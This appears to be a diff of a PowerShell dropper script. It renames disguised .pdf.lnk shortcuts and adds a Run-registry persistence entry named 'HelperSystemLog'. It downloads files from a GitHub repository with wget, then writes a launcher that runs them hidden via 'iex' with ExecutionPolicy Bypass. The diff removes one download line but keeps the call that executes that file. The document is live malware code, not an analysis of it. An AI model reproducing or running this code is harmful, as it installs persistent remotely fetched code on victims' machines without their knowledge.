@@ -4,7 +4,6 @@ dir *.pdf.lnk | ren -NewName {$_.BaseName};
 New-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "HelperSystemLog" -Value 'C:\T\update.lnk' -Force;
 wget https://raw.githubusercontent.com/licheng10203040-cloud/1/refs/heads/main/r -o C:\T\r;
 wget https://github.com/licheng10203040-cloud/1/raw/refs/heads/main/lnk -o C:\T\update.lnk;
-wget https://github.com/licheng10203040-cloud/1/raw/refs/heads/main/check -o C:\T\check;
 echo '!powershell "-ExecutionPolicy Bypass -w 1 iex(Get-Content C:\T\r);iex(Get-Content C:\T\check)"' > C:\T\1;
 exit
 
